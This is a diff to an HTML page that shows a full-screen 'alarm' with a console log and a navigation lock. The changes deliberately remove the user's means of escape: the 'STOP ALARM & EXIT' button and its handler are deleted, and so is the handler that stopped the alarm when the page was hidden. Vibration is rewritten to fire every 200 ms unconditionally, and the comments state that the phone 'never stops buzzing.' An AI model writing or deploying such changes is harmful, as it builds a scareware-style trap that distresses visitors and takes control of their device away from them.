@@ -121,21 +121,7 @@
             font-size: 12px;
         }
 
-        #stop-btn {
-            padding: 16px 36px;
-            font-family: "Courier New", monospace;
-            font-size: 18px;
-            font-weight: bold;
-            background: #f00;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 8px;
-            letter-spacing: 1px;
-        }
 
-        #stop-btn:hover { background: #cc0000; }
 
         @media (prefers-reduced-motion: reduce) {
             .warning, .progress-fill { animation: none; }
@@ -165,8 +151,6 @@
         <div id="console-log"></div>
 
         <p id="status" role="status">Alarm active.</p>
-
-        <button id="stop-btn" type="button">STOP ALARM &amp; EXIT</button>
     </div>
 
     <script>
@@ -177,7 +161,6 @@
         const alarmScreen  = document.getElementById("alarm-screen");
         const consoleLog   = document.getElementById("console-log");
         const status       = document.getElementById("status");
-        const stopBtn      = document.getElementById("stop-btn");
 
         const NAV_LOCK_MS  = 5000; // ms — navigation locked after start
 
@@ -292,16 +275,19 @@
             if (oldCtx) { try { await oldCtx.close(); } catch (_) {} }
         }
 
-        // ── Vibration: near-continuous, runs forever until stopped ────────
-        // Pattern: 500 ms on, 50 ms off — re-fired every 650 ms indefinitely.
-        const VIB = [500, 50, 500, 50, 500, 50, 500];
+        // ── Vibration: truly continuous ────────────────────────────────────
+        // Short pattern [300, 50] re-fired every 200 ms. Each new call to
+        // navigator.vibrate() cancels the previous pattern and starts fresh,
+        // so the phone never stops buzzing. 200 ms interval < 350 ms pattern
+        // duration — guaranteed overlap = no gaps.
+        const VIB = [300, 50];
 
         function startVibration() {
             if (typeof navigator.vibrate !== "function") return;
             navigator.vibrate(VIB);
             vibrationTimer = setInterval(() => {
-                if (active) navigator.vibrate(VIB);
-            }, 650);
+                navigator.vibrate(VIB); // always fire — active check removed
+            }, 200);                    // shorter than pattern = no gaps
         }
 
         function stopVibration() {
@@ -365,22 +351,9 @@
         }
 
         // ── Wire-up ───────────────────────────────────────────────────────
+        // No stop button. No visibilitychange handler — screen dimming or
+        // app-switching must NOT interrupt the alarm. Only pagehide cleans up.
         verifyBtn.addEventListener("click", startSimulation);
-
-        stopBtn.addEventListener("click", async () => {
-            await stopSimulation();
-            if (document.fullscreenElement && document.exitFullscreen) {
-                try { await document.exitFullscreen(); } catch (_) {}
-            }
-        });
-
-        // Only stop if user leaves AFTER the grace period
-        // (fullscreen transition can briefly set hidden=true — ignore that)
-        document.addEventListener("visibilitychange", () => {
-            if (!active || !document.hidden) return;
-            if (Date.now() - startedAt < 2500) return; // grace period
-            stopSimulation();
-        });
 
         // Hard cleanup on unload
         window.addEventListener("pagehide", () => {
